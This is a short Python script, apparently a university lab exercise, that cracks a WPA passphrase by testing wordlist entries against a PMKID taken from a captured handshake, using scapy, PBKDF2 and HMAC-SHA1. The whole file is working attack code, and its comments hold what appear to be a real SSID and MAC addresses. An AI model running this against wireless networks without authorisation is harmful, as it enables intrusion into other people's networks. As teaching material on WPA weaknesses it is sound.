#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Crack a WPA key targeting a PMKID
"""

__author__      = "Hugo Jeanneret et Pascal Perrenoud"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import rdpcap, Dot11Beacon, Dot11, EAPOL, raw
from tqdm import tqdm
import helpers
from hashlib import sha1
from pbkdf2 import pbkdf2
from binascii import a2b_hex, b2a_hex
import hmac

# Load parameters
wpa         = rdpcap("PMKID_handshake.pcap")

# Isolation d'une tentative de 4-way handshake
wpa         = wpa[144:146]

# Retrieves SSID
ssid        = helpers.find_ssid(wpa) # str.encode("Sunrise_2.4GHz_DD4B90")
# Retrieves flag (PMKID)
flag        = a2b_hex(helpers.get_pmkid(wpa[1])) # a2b_hex("7fd0bc061552217e942d19c6686f1598")
# Retrieves AP address
MAC_AP      = a2b_hex((wpa[1][Dot11]).addr2.replace(':', '')) # a2b_hex("90:dd:5d:95:bc:14".replace(':', ''))
# Retrieves STA address
MAC_STA     = a2b_hex((wpa[1][Dot11]).addr1.replace(':', '')) # a2b_hex("90:4d:4a:dd:4b:94".replace(':', ''))

print(f"SSID : {ssid}")
print(f"MAC_AP : {MAC_AP}")
print(f"MAC_STA : {MAC_STA}")
print("flag : ", flag)



def check(k):
    """
    Attacks a PMKID by computing a new one based on a guessed key then comparing it
    """
    k = str.encode(k)

    # Computes PMK based on the guessed key
    pmk = pbkdf2(sha1, k, str.encode(ssid), 4096, 32)

    # Computes PMKID with the PMK
    pmkid = hmac.new(pmk, b"PMK Name" + MAC_AP + MAC_STA, sha1)

    # Compare the new PMK with the flag
    return flag == pmkid.digest()[:len(flag)]


# Use wordlist to attack the MIC
num_lines = sum(1 for line in open("wordlist.txt"))
print(f"Line count in wordlist : {num_lines}")
with open("wordlist.txt", 'r') as file:
    for key in tqdm(file, total=num_lines):
        if check(key.strip()):
            print(f"Key found ! It's {key.strip()}")
            break
    else:
        print("Key not found in the given wordlist")

